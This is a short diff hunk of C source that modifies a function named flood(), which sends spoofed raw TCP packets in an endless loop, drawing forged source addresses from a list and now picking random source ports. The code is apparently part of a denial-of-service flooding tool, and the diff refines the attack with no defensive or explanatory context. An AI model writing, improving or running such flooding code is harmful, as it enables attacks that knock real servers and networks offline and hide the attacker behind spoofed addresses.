@@ -205,20 +205,14 @@ void *flood(void *par1)
     while(1){
         sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
  
-        iph->saddr = htonl(class[rand_cmwc()%64]); //64 is the count of decimals
+        iph->saddr = htonl(class[rand_cmwc()%64]);
         iph->id = htonl(30000 + rand_cmwc() % 38323); 
         iph->check = csum ((unsigned short *) datagram, iph->tot_len);
-        tcph->source = htons(sourceports);
+        
+        int random_index = randnum(0, sizeof(sourceports) / sizeof(sourceports[0]) - 1);
+        int random_port = sourceports[random_index];
+        tcph->source = htons(random_port);
         tcph->check = tcpcsum(iph, tcph);
-        tcph->seq = 0;
-        tcph->ack_seq = 1;
-        tcph->res2 = 0;
-        tcph->doff = 5;
-        tcph->ack = 1;
-        tcph->psh = 1;
-        tcph->window = htons(64240);
-        tcph->check = 0;
-        tcph->urg_ptr = 0;
         
         if (floodport == 0)
         {
